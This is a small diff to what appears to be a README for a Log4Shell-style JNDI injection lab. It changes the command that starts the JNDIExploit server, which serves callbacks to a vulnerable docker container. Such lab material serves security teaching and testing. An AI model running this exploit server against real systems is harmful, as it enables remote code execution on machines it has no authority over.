@@ -33,7 +33,7 @@ Note, the deployment may take up to 3 minutes including the installation of the 
 
 Starting the Server:
 
-- `java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $MY_IP -p 8888`
+- `java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $(hostname -I | awk '{print $1}') -p 8888`
 
 The JNDI Exploit Server needs to be running and receiving callbacks from the vulnerable docker container.
 
